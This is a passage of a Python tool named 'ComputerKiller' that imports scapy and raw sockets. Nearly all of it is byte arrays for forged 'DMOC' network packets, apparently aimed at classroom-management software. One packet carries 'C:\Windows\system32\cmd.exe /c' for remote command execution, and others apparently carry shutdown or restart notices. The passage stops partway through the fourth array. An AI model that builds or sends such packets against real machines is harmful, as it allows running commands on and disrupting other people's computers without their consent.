# -*- coding: utf-8 -*-

# self.tab1 implementation generated from reading ui file 'ComputerKiller.ui'
#
# Created by: PyQt5 UI code generator 5.15.4
#
# WARNING: Any manual changes made to this file will be lost when pyuic5 is
# run again.  Do not edit this file unless you know what you are doing.


from PyQt5 import QtCore, QtWidgets
import sys
import socket
from struct import pack
from win32api import MessageBox
from win32con import MB_ICONWARNING, MB_ICONASTERISK
from scapy.all import *
from threading import Thread

QtCore.stop = 0
QtCore.running = 0
QtCore.stop2 = 0
QtCore.running2 = 0

header = [0x44, 0x4d, 0x4f, 0x43, 0x00, 0x00, 0x01, 0x00, 0x9e, 0x03, 0x00, 0x00, 0x10, 0x41, 0xaf, 0xfb, 0xa0, 0xe7,
          0x52, 0x40, 0x91,
          0xdc, 0x27, 0xa3, 0xb6, 0xf9, 0x29, 0x2e, 0x20, 0x4e, 0x00, 0x00, 0xc0, 0xa8, 0x50, 0x81, 0x91, 0x03, 0x00,
          0x00, 0x91, 0x03, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00,
          0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
          0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
          0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
          0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
          0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
          0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
          0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
          0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
          0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
          0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
          0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
          0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
          0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
          0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
          0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
          0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
          0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
          0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
          0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
          0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
          0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
          0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
          0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
          0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
          0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
          0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
          0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
          0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
          0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
          0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
          0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
          0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
          0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
          0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
          0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
          0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
          0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
          0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
          0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
          0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
          0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
          0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
          0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
          0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
          0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
          0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
          0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
          0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
          0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
          0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]

header2 = [0x44, 0x4d, 0x4f, 0x43, 0x00, 0x00, 0x01, 0x00, 0x6e, 0x03, 0x00, 0x00, 0x5b, 0x68, 0x2b, 0x25, 0x6f, 0x61,
           0x64, 0x4d, 0xa7, 0x92, 0xf0, 0x47, 0x00, 0xc5, 0xa4, 0x0e, 0x20, 0x4e, 0x00, 0x00, 0xc0, 0xa8, 0x64, 0x86,
           0x61, 0x03, 0x00, 0x00, 0x61, 0x03, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0f, 0x00,
           0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x43, 0x00, 0x3a, 0x00, 0x5c, 0x00, 0x57, 0x00, 0x69, 0x00, 0x6e, 0x00,
           0x64, 0x00, 0x6f, 0x00, 0x77, 0x00, 0x73, 0x00, 0x5c, 0x00, 0x73, 0x00, 0x79, 0x00, 0x73, 0x00, 0x74, 0x00,
           0x65, 0x00, 0x6d, 0x00, 0x33, 0x00, 0x32, 0x00, 0x5c, 0x00, 0x63, 0x00, 0x6d, 0x00, 0x64, 0x00, 0x2e, 0x00,
           0x65, 0x00, 0x78, 0x00, 0x65, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x2f, 0x00, 0x63, 0x00,
           0x20, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00]

header3 = [0x44, 0x4d, 0x4f, 0x43, 0x00, 0x00, 0x01, 0x00, 0x2a, 0x02, 0x00, 0x00, 0xc8, 0xe3, 0x97, 0xfd, 0xc0, 0xb5,
           0x9f, 0x45, 0x87, 0x72, 0x05, 0xbd, 0x4e, 0x46, 0xa8, 0x96, 0x20, 0x4e, 0x00, 0x00, 0xc0, 0xa8, 0x50, 0x81,
           0x1d, 0x02, 0x00, 0x00, 0x1d, 0x02, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x14, 0x00,
           0x00, 0x10, 0x0f, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x59, 0x65, 0x08, 0x5e,
           0x06, 0x5c, 0x73, 0x51, 0xed, 0x95, 0xa8, 0x60, 0x84, 0x76, 0xa1, 0x8b, 0x97, 0x7b, 0x3a, 0x67, 0x02, 0x30,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00]

header4 = [0x44, 0x4d, 0x4f, 0x43, 0x00, 0x00, 0x01, 0x00, 0x2a, 0x02, 0x00, 0x00, 0xbf, 0x40, 0x22, 0x4e, 0x57, 0x2d,
           0x3e, 0x4f, 0x9b, 0x6f, 0xc1, 0x8d, 0xe1, 0xeb, 0x4f, 0x62, 0x20, 0x4e, 0x00, 0x00, 0xc0, 0xa8, 0x50, 0x81,
           0x1d, 0x02, 0x00, 0x00, 0x1d, 0x02, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x13, 0x00,
           0x00, 0x10, 0x0f, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x59, 0x65, 0x08, 0x5e,
           0x06, 0x5c, 0xcd, 0x91, 0x2f, 0x54, 0xa8, 0x60, 0x84, 0x76, 0xa1, 0x8b, 0x97, 0x7b, 0x3a, 0x67, 0x02, 0x30,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
